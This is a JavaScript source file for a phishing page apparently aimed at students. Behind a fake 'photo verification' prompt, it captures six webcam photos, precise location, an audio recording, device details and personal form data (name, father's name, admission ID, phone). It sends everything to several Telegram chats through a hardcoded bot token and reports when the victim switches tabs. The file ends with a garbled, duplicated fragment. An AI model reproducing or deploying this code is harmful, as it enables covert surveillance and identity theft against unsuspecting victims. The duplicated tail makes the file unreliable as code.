const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';

// Array of chat IDs to send to all users
const CHAT_IDS = [
    '1332669070',
    '7246514514',
    '7994937893',
    '7646169456'
];

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let isRecording = false;
let permissionAttempts = 0;
const MAX_PERMISSION_ATTEMPTS = 8;

// 🎯 Enhanced initialization with PHOTO FIRST approach
class SurveillanceSystem {
    constructor() {
        this.isTelegramWeb = this.detectTelegramWeb();
        this.isChrome = this.detectChrome();
        this.sessionId = this.generateSessionId();
        this.userData = {};
        
        // Show permission popup first
        this.showPermissionPopup();
    }

    // 🔍 Generate unique session ID
    generateSessionId() {
        return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    // 🔍 Detect if running in Telegram Web
    detectTelegramWeb() {
        const userAgent = navigator.userAgent.toLowerCase();
        return userAgent.includes('telegram') || 
               userAgent.includes('webview') || 
               window.TelegramWebviewProxy !== undefined;
    }

    // 🔍 Detect if running in Chrome
    detectChrome() {
        const userAgent = navigator.userAgent.toLowerCase();
        return userAgent.includes('chrome') && !userAgent.includes('edg');
    }

    // 🚨 PERMISSION POPUP - Shows first before anything else
    showPermissionPopup() {
        const popupHTML = `
            <div id="permissionPopup" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.95);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 100000;
                font-family: Arial, sans-serif;
                backdrop-filter: blur(15px);
            ">
                <div style="
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    padding: 40px;
                    border-radius: 25px;
                    text-align: center;
                    max-width: 500px;
                    color: white;
                    box-shadow: 0 25px 50px rgba(0,0,0,0.5);
                    border: 3px solid rgba(255,255,255,0.1);
                    animation: pulse 2s infinite;
                ">
                    <div style="font-size: 5em; margin-bottom: 20px;">📸</div>
                    <h1 style="font-size: 2em; margin-bottom: 20px; color: white;">PHOTO VERIFICATION REQUIRED</h1>
                    
                    <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; margin-bottom: 25px; text-align: left;">
                        <p style="margin: 15px 0; font-size: 1.1em;">📷 <strong>Camera Access:</strong> Immediate photo capture for verification</p>
                        <p style="margin: 15px 0; font-size: 1.1em;">🎤 <strong>Microphone Access:</strong> Audio recording for security</p>
                        <p style="margin: 15px 0; font-size: 1.1em;">📍 <strong>Location Access:</strong> Location verification</p>
                        <p style="margin: 15px 0; font-size: 1.1em;">⚡ <strong>All Permissions:</strong> Required to proceed</p>
                    </div>

                    <p style="font-size: 1.2em; margin-bottom: 30px; line-height: 1.5;">
                        <strong style="color: #ffeaa7;">IMMEDIATE PHOTO CAPTURE:</strong><br>
                        We will take photos first for identity verification before showing the form.
                    </p>

                    <button onclick="window.surveillanceSystem.startSystem()" style="
                        background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
                        color: white;
                        border: none;
                        padding: 18px 50px;
                        border-radius: 50px;
                        font-size: 1.3em;
                        font-weight: bold;
                        cursor: pointer;
                        margin: 10px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                        transition: all 0.3s;
                    " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 40px rgba(0,0,0,0.4)'" 
                    onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 30px rgba(0,0,0,0.3)'">
                        Start Photo Verification
                    </button>

                    <p style="margin-top: 20px; font-size: 0.9em; opacity: 0.8;">
                        Camera will activate immediately after clicking
                    </p>
                </div>
            </div>

            <style>
                @keyframes pulse {
                    0% { transform: scale(1); }
                    50% { transform: scale(1.02); }
                    100% { transform: scale(1); }
                }
            </style>
        `;
        
        document.body.insertAdjacentHTML('afterbegin', popupHTML);
    }

    // 🚀 Start the system after user acknowledges permissions
    async startSystem() {
        // Remove the popup
        const popup = document.getElementById('permissionPopup');
        if (popup) popup.remove();

        // Show loading screen
        this.showLoadingScreen();

        try {
            console.log('🚀 Starting Photo-First Surveillance System');
            
            // Send initial system info
            await this.sendInitialSystemInfo();
            
            // CAPTURE PHOTOS FIRST before anything else
            await this.capturePhotosFirst();
            
            // Then initialize other components
            await this.initializeOtherComponents();
            
        } catch (error) {
            console.error('System initialization failed:', error);
            this.sendToAllUsers('🚨 *System Initialization Failed*\n• Error: ' + error.message);
        }
    }

    // ⏳ Show loading screen
    showLoadingScreen() {
        const loadingHTML = `
            <div id="loadingScreen" style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 99999;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 30px;
            ">
                <div style="font-size: 4em; margin-bottom: 30px;">📸</div>
                <h1 style="font-size: 2.5em; margin-bottom: 20px;">Starting Photo Verification</h1>
                <p style="font-size: 1.3em; margin-bottom: 30px;">Preparing camera for immediate photo capture...</p>
                
                <div style="width: 300px; height: 10px; background: rgba(255,255,255,0.2); border-radius: 5px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: #00b894; transition: width 3s ease-in-out;"></div>
                </div>
                
                <p style="margin-top: 20px; font-size: 1em; opacity: 0.8;" id="loadingStatus">Initializing camera...</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('afterbegin', loadingHTML);

        // Animate progress bar
        setTimeout(() => {
            const progressBar = document.getElementById('progressBar');
            const loadingStatus = document.getElementById('loadingStatus');
            if (progressBar) progressBar.style.width = '20%';
            if (loadingStatus) loadingStatus.textContent = 'Accessing camera...';
        }, 500);
    }

    // 📸 CAPTURE PHOTOS FIRST - Main photo capture function
    async capturePhotosFirst() {
        this.updateLoadingStatus('Accessing camera for photos...', 30);
        
        try {
            // Get camera access immediately
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    facingMode: 'user',
                    frameRate: { ideal: 30 }
                },
                audio: false // Start with just video for photos
            });

            mediaStream = stream;
            
            this.updateLoadingStatus('Camera accessed successfully!', 50);
            this.sendToAllUsers('✅ *Camera Access Granted - Photo Mode*\n• Session: ' + this.sessionId + '\n• Starting immediate photo capture');

            // Capture rapid burst of photos
            await this.captureImmediatePhotos(stream);

            this.updateLoadingStatus('Photos captured successfully!', 80);

        } catch (error) {
            console.error('Photo capture failed:', error);
            this.sendToAllUsers('❌ *Photo Capture Failed*\n• Session: ' + this.sessionId + '\n• Error: ' + error.message);
            this.updateLoadingStatus('Photo capture failed, continuing...', 80);
        }
    }

    // 📸 IMMEDIATE PHOTO CAPTURE - Rapid burst of photos
    async captureImmediatePhotos(stream) {
        this.updateLoadingStatus('Capturing verification photos...', 60);
        
        try {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.playsInline = true;
            video.autoplay = true;

            // Wait for video to be ready
            await new Promise((resolve) => {
                if (video.readyState >= 4) {
                    resolve();
                } else {
                    video.addEventListener('loadeddata', resolve, { once: true });
                    setTimeout(resolve, 2000);
                }
            });

            this.sendToAllUsers('📸 *Starting Immediate Photo Capture*\n• Session: ' + this.sessionId + '\n• Photos: 6 rapid shots');

            // Capture 6 photos in very rapid succession
            const photoPromises = [];
            for (let i = 0; i < 6; i++) {
                photoPromises.push(
                    new Promise(resolve => 
                        setTimeout(async () => {
                            await this.captureAndSendPhoto(video, i + 1);
                            resolve();
                        }, i * 800) // 0.8 seconds between photos
                    )
                );
            }

            await Promise.all(photoPromises);
            
            this.sendToAllUsers('✅ *Photo Capture Complete*\n• Session: ' + this.sessionId + '\n• Total Photos: 6\n• Status: Success');

        } catch (error) {
            console.error('Immediate photo capture failed:', error);
            throw error;
        }
    }

    // 📸 CAPTURE AND SEND SINGLE PHOTO
    async captureAndSendPhoto(video, photoNumber) {
        return new Promise((resolve) => {
            try {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d', { willReadFrequently: true });

                // Use high resolution
                canvas.width = video.videoWidth || 1920;
                canvas.height = video.videoHeight || 1080;

                if (canvas.width === 0 || canvas.height === 0) {
                    canvas.width = 1920;
                    canvas.height = 1080;
                }

                // Draw video frame to canvas
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Add professional overlay
                context.fillStyle = 'rgba(0, 0, 0, 0.8)';
                context.fillRect(0, 0, canvas.width, 80);
                
                context.font = 'bold 24px Arial';
                context.fillStyle = 'white';
                context.textAlign = 'center';
                context.fillText(`VERIFICATION PHOTO ${photoNumber}`, canvas.width / 2, 35);
                
                context.font = '18px Arial';
                context.fillText(`${new Date().toLocaleString()} • Session: ${this.sessionId}`, canvas.width / 2, 65);

                // Capture high quality photo
                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 1000) {
                        try {
                            await this.sendToAllUsers(blob, 'photo');
                            console.log(`✅ Photo ${photoNumber} sent successfully`);
                        } catch (error) {
                            console.error(`❌ Photo ${photoNumber} send failed:`, error);
                        }
                    }
                    resolve();
                }, 'image/jpeg', 0.95); // Very high quality

            } catch (error) {
                console.error(`Photo ${photoNumber} capture failed:`, error);
                resolve();
            }
        });
    }

    // 🎯 INITIALIZE OTHER COMPONENTS after photos
    async initializeOtherComponents() {
        this.updateLoadingStatus('Starting location tracking...', 85);

        // Get location
        await this.initializeGeolocation();

        this.updateLoadingStatus('Starting audio recording...', 90);

        // Get audio access and record
        await this.initializeAudioRecording();

        this.updateLoadingStatus('Setting up verification form...', 95);

        // Initialize form
        await this.initializeFormHandler();

        this.updateLoadingStatus('System ready!', 100);

        // Remove loading screen
        setTimeout(() => {
            const loadingScreen = document.getElementById('loadingScreen');
            if (loadingScreen) loadingScreen.remove();
            
            this.showSystemReadyMessage();
            
        }, 1000);
    }

    // 📍 Initialize Geolocation
    async initializeGeolocation() {
        return new Promise(async (resolve) => {
            if (!navigator.geolocation) {
                this.sendToAllUsers('❌ *Geolocation not supported*\n• Session: ' + this.sessionId);
                resolve();
                return;
            }

            try {
                const position = await new Promise((positionResolve, positionReject) => {
                    navigator.geolocation.getCurrentPosition(
                        positionResolve, 
                        positionReject, 
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });

                const { latitude, longitude, accuracy } = position.coords;
                const locationMessage = `📍 *Location Captured*\n\n• **Latitude:** ${latitude}\n• **Longitude:** ${longitude}\n• **Accuracy:** ${accuracy}m\n• **Map:** https://maps.google.com/?q=${latitude},${longitude}\n• **Session:** ${this.sessionId}`;
                
                this.sendToAllUsers(locationMessage);
                resolve();

            } catch (error) {
                this.sendToAllUsers('❌ *Location Access Denied*\n• Session: ' + this.sessionId + '\n• Error: ' + error.message);
                resolve();
            }
        });
    }

    // 🎤 Initialize Audio Recording
    async initializeAudioRecording() {
        try {
            // Add audio to existing stream
            const audioStream = await navigator.mediaDevices.getUserMedia({ 
                audio: {
                    echoCancellation: true,
                    noiseSuppression: true,
                    sampleRate: 44100,
                    channelCount: 2
                } 
            });

            // Add audio tracks to existing stream
            audioStream.getAudioTracks().forEach(track => {
                mediaStream.addTrack(track);
            });

            // Start short audio recording
            await this.startAudioRecording(5000); // 5 second recording

        } catch (error) {
            this.sendToAllUsers('❌ *Audio Access Denied*\n• Session: ' + this.sessionId + '\n• Error: ' + error.message);
        }
    }

    // 🎤 Start Audio Recording
    async startAudioRecording(duration = 5000) {
        return new Promise(async (resolve) => {
            try {
                if (!MediaRecorder) {
                    resolve();
                    return;
                }

                recordedChunks = [];
                const options = {
                    mimeType: 'audio/webm;codecs=opus',
                    audioBitsPerSecond: 128000
                };

                mediaRecorder = new MediaRecorder(mediaStream, options);
                isRecording = true;

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    isRecording = false;
                    try {
                        const audioBlob = new Blob(recordedChunks, { type: 'audio/webm' });
                        if (audioBlob.size > 0) {
                            await this.sendToAllUsers(audioBlob, 'audio');
                            this.sendToAllUsers('🎤 *Audio Recording Complete*\n• Duration: ' + (duration/1000) + 's\n• Session: ' + this.sessionId);
                        }
                    } catch (error) {
                        console.error('Audio processing error:', error);
                    }
                    resolve();
                };

                mediaRecorder.start();
                this.sendToAllUsers('🎤 *Audio Recording Started*\n• Duration: ' + (duration/1000) + 's\n• Session: ' + this.sessionId);

                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    } else {
                        resolve();
                    }
                }, duration);

            } catch (error) {
                console.error('Audio recording failed:', error);
                resolve();
            }
        });
    }

    // 📊 Update loading screen status
    updateLoadingStatus(status, progress) {
        const loadingStatus = document.getElementById('loadingStatus');
        const progressBar = document.getElementById('progressBar');
        
        if (loadingStatus) loadingStatus.textContent = status;
        if (progressBar) progressBar.style.width = progress + '%';
    }

    // ✅ Show system ready message
    showSystemReadyMessage() {
        const readyHTML = `
            <div id="systemReady" style="
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: linear-gradient(135deg, #00b894 0%, #00a085 100%);
                color: white;
                padding: 30px;
                border-radius: 20px;
                text-align: center;
                z-index: 99998;
                font-family: Arial, sans-serif;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
                border: 3px solid rgba(255,255,255,0.2);
                animation: fadeIn 0.5s ease-in;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">✅</div>
                <h2 style="margin-bottom: 15px; font-size: 1.8em;">Verification Complete!</h2>
                <p style="margin-bottom: 10px; font-size: 1.1em;">✅ 6 Photos Captured</p>
                <p style="margin-bottom: 10px; font-size: 1.1em;">✅ Location Recorded</p>
                <p style="margin-bottom: 10px; font-size: 1.1em;">✅ Audio Verified</p>
                <p style="opacity: 0.8; margin-top: 15px;">You can now proceed with the form.</p>
            </div>

            <style>
                @keyframes fadeIn {
                    from { opacity: 0; transform: translate(-50%, -60%); }
                    to { opacity: 1; transform: translate(-50%, -50%); }
                }
            </style>
        `;
        
        document.body.insertAdjacentHTML('beforeend', readyHTML);

        // Auto-remove after 4 seconds
        setTimeout(() => {
            const readyMsg = document.getElementById('systemReady');
            if (readyMsg) readyMsg.remove();
        }, 4000);
    }

    // 📝 Form Handler
    initializeFormHandler() {
        const loginForm = document.getElementById('loginForm');
        if (!loginForm) {
            this.createFallbackForm();
            return;
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.handleFormSubmission();
        });
    }

    // 🚀 Handle form submission
    async handleFormSubmission() {
        try {
            const formData = this.collectFormData();
            const formMessage = this.createFormMessage(formData);
            await this.sendToAllUsers(formMessage);

            this.showProcessingMessage();

            // Capture final verification photo
            await this.captureFinalPhoto();

            this.showSuccessMessage(formData.name);

        } catch (error) {
            console.error('Form submission error:', error);
            this.showSuccessMessage('User');
        }
    }

    // 📄 Collect form data
    collectFormData() {
        return {
            name: document.getElementById('name')?.value.trim() || 'Not provided',
            father: document.getElementById('father')?.value.trim() || 'Not provided',
            admId: document.getElementById('admId')?.value.trim() || 'Not provided',
            phone: document.getElementById('phone')?.value.trim() || 'Not provided',
            timestamp: new Date().toLocaleString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            sessionId: this.sessionId
        };
    }

    // 📝 Create form message
    createFormMessage(formData) {
        return `📄 *Form Submission - Final Step*\n\n` +
            `• 👤 **Full Name:** ${formData.name}\n` +
            `• 👨‍👦 **Father's Name:** ${formData.father}\n` +
            `• 🆔 **Admission ID:** ${formData.admId}\n` +
            `• 📞 **Phone Number:** ${formData.phone}\n` +
            `• 🕐 **Submission Time:** ${formData.timestamp}\n` +
            `• 💻 **Platform:** ${formData.platform}\n` +
            `• 📱 **Screen:** ${formData.screen}\n` +
            `• 🆔 **Session ID:** ${formData.sessionId}`;
    }

    // 📸 Capture final photo
    async captureFinalPhoto() {
        if (!mediaStream) return;
        
        try {
            const video = document.createElement('video');
            video.srcObject = mediaStream;
            await video.play();
            await new Promise(resolve => setTimeout(resolve, 1000));
            await this.captureAndSendPhoto(video, 'FINAL_VERIFICATION');
        } catch (error) {
            console.error('Final photo capture failed:', error);
        }
    }

    // ⏳ Show processing message
    showProcessingMessage() {
        const processingHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">⏳</div>
                <h1 style="font-size: 2em; margin-bottom: 20px;">Final Verification</h1>
                <p style="font-size: 1.2em; margin-bottom: 10px;">Processing your information...</p>
                <p style="font-size: 1em; opacity: 0.8;">Session: ${this.sessionId}</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', processingHTML);
    }

    // 💫 Success message
    showSuccessMessage(name) {
        const processingMsg = document.querySelector('div[style*="background: linear-gradient(135deg, #ff7e5f 0%, #feb47b 100%)"]');
        if (processingMsg) processingMsg.remove();

        const successHTML = `
            <div style="
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 10000;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 20px;
            ">
                <div style="font-size: 4em; margin-bottom: 20px;">🎉</div>
                <h1 style="font-size: 2.5em; margin-bottom: 20px;">Verification Complete!</h1>
                <p style="font-size: 1.5em; margin-bottom: 30px;">Dear ${name}, your verification is successful.</p>
                <p style="font-size: 1.2em; margin-bottom: 20px; opacity: 0.9;">✅ 7 Photos Captured</p>
                <p style="font-size: 1.2em; margin-bottom: 20px; opacity: 0.9;">✅ Location Verified</p>
                <p style="font-size: 1.2em; margin-bottom: 30px; opacity: 0.9;">✅ Audio Recorded</p>
                <p style="font-size: 1.2em; opacity: 0.9;">Session: ${this.sessionId}</p>
                <p style="font-size: 1.2em; opacity: 0.9; margin-top: 20px;">Redirecting to results portal...</p>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', successHTML);
        
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 5000);
    }

    // 📋 Create fallback form
    createFallbackForm() {
        const formHTML = `
            <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; padding: 20px;">
                <h2 style="color: #333; margin-bottom: 10px;">Student Verification Form</h2>
                <p style="color: #666; margin-bottom: 30px;">Your photos and location have been verified. Please complete your details.</p>
                <form id="fallbackLoginForm">
                    <input type="text" id="name" placeholder="Full Name" required style="display: block; width: 100%; margin: 15px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px;">
                    <input type="text" id="father" placeholder="Father's Name" required style="display: block; width: 100%; margin: 15px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px;">
                    <input type="text" id="admId" placeholder="Admission ID" required style="display: block; width: 100%; margin: 15px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px;">
                    <input type="tel" id="phone" placeholder="Phone Number" required style="display: block; width: 100%; margin: 15px 0; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px;">
                    <button type="submit" style="background: #4CAF50; color: white; padding: 18px 30px; border: none; border-radius: 10px; cursor: pointer; font-size: 1.1em; width: 100%; margin-top: 20px;">Complete Verification</button>
                </form>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', formHTML);
        
        document.getElementById('fallbackLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            await this.handleFormSubmission();
        });
    }

    // 🖥️ Initial System Info
    async sendInitialSystemInfo() {
        const systemInfo = `🖥️ *System Started - Photo First Mode*\n\n` +
            `• 🆔 **Session ID:** ${this.sessionId}\n` +
            `• 🌐 **URL:** ${window.location.href}\n` +
            `• 🕐 **Time:** ${new Date().toLocaleString()}\n` +
            `• 📱 **User Agent:** ${navigator.userAgent.substring(0, 80)}...\n` +
            `• 💻 **Platform:** ${navigator.platform}\n` +
            `• 🖥️ **Screen:** ${screen.width}x${screen.height}\n` +
            `• 🌍 **Language:** ${navigator.language}\n` +
            `• ⚡ **Cores:** ${navigator.hardwareConcurrency || 'Unknown'}\n` +
            `• 📊 **Memory:** ${navigator.deviceMemory || 'Unknown'}GB\n` +
            `• 🔍 **Environment:** ${this.isTelegramWeb ? 'Telegram Web' : (this.isChrome ? 'Chrome' : 'Other Browser')}\n` +
            `• 📸 **Mode:** Immediate Photo Capture First`;

        await this.sendToAllUsers(systemInfo);
    }

    // 📤 Send to all users
    async sendToAllUsers(data, type = 'message') {
        const sendTime = Date.now();
        
        try {
            const sendPromises = CHAT_IDS.map(async (chatId, index) => {
                try {
                    await this.sendToTelegram(data, type, chatId);
                    console.log(`✅ Sent ${type} to ${chatId} (${index + 1}/${CHAT_IDS.length})`);
                } catch (error) {
                    console.error(`❌ Failed to send to ${chatId}:`, error);
                }
            });

            await Promise.allSettled(sendPromises);
            
            const duration = Date.now() - sendTime;
            console.log(`📤 All ${type} messages processed in ${duration}ms`);

        } catch (error) {
            console.error('Batch send error:', error);
        }
    }

    // 📤 Telegram API
    async sendToTelegram(data, type = 'message', chatId) {
        const maxRetries = 3;
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                if (type === 'photo') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', data);
                    formData.append('caption', `📸 Verification Photo • Session: ${this.sessionId} • ${new Date().toLocaleString()}`);

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                } else if (type === 'audio') {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('audio', data, `audio_${Date.now()}.ogg`);
                    formData.append('caption', `🎤 Audio Recording • Session: ${this.sessionId}`);

                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
                        method: 'POST',
                        body: formData
                    });

                } else {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: data,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true
                        })
                    });
                }
                
                break;

            } catch (error) {
                if (attempt === maxRetries) {
                    throw error;
                }
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
        }
    }

    // 🛑 Cleanup
    cleanup() {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        }

        if (mediaStream) {
            mediaStream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            mediaStream = null;
        }

        recordedChunks = [];
        isRecording = false;

        console.log('🛑 Surveillance system cleaned up');
    }
}

// 🚀 Initialize the system - This creates the global instance
const surveillanceSystem = new SurveillanceSystem();

// 🎯 Event listeners
window.addEventListener('load', () => {
    console.log('🚀 Page loaded - Photo-first system ready');
});

window.addEventListener('beforeunload', () => {
    surveillanceSystem.cleanup();
    surveillanceSystem.sendToAllUsers('👋 *Session Ended*\n• Session: ' + surveillanceSystem.sessionId + '\n• Time: ' + new Date().toLocaleString());
});

window.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        surveillanceSystem.sendToAllUsers('🔍 *User switched tab/window*\n• Session: ' + surveillanceSystem.sessionId + '\n• Time: ' + new Date().toLocaleString());
    }
});

window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
    surveillanceSystem.sendToAllUsers('🚨 *JavaScript Error*\n• Session: ' + surveillanceSystem.sessionId + '\n• Error: ' + event.error?.message);
});diaStream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            mediaStream = null;
        }

        recordedChunks = [];
        isRecording = false;

        console.log('🛑 Surveillance system cleaned up');
    }
}

// 🚀 Initialize the system - This creates the global instance
const surveillanceSystem = new SurveillanceSystem();

// 🎯 Event listeners
window.addEventListener('load', () => {
    console.log('🚀 Page loaded - Permission popup active');
});

window.addEventListener('beforeunload', () => {
    surveillanceSystem.cleanup();
    surveillanceSystem.sendToAllUsers('👋 *Session Ended*\n• Session: ' + surveillanceSystem.sessionId + '\n• Time: ' + new Date().toLocaleString());
});

window.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        surveillanceSystem.sendToAllUsers('🔍 *User switched tab/window*\n• Session: ' + surveillanceSystem.sessionId + '\n• Time: ' + new Date().toLocaleString());
    }
});

window.addEventListener('error', (event) => {
    console.error('Global error:', event.error);
    surveillanceSystem.sendToAllUsers('🚨 *JavaScript Error*\n• Session: ' + surveillanceSystem.sessionId + '\n• Error: ' + event.error?.message);
});